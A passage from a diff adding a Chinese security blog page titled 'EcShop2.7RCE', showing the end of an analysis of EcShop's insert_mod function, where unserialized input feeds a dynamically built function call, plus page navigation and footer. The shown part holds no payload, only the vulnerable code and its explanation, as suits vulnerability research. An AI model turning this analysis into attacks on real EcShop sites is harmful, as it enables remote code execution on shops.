class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>; <span class="comment">// 返回html数据，直接是编译之后的模板数据</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>跟进insert_mod方法，直接就看见一个动态函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span>(<span class="params"><span class="variable">$name</span></span>) // 处理动态内容</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$fun</span>, <span class="variable">$para</span>) = explode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$name</span>);<span class="comment">//name是编译后的模板返回的东西，函数名在右，参数名在左</span></span><br><span class="line">        <span class="variable">$para</span> = unserialize(<span class="variable">$para</span>);</span><br><span class="line">        <span class="variable">$fun</span> = <span class="string">&#x27;insert_&#x27;</span> . <span class="variable">$fun</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fun</span>(<span class="variable">$para</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：EcShop2.7RCE</li>
+        <li>本文作者：p1k</li>
+        <li>创建时间：2021-01-25 10:57:03</li>
+        <li>
+            本文链接：http://p1keman.github.io/2021/01/25/EcShop2-7RCE/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/03/09/BUU-three/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">BUU-three</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数 <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量 <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动 | 主题 <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rce"><span class="nav-text">rce</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
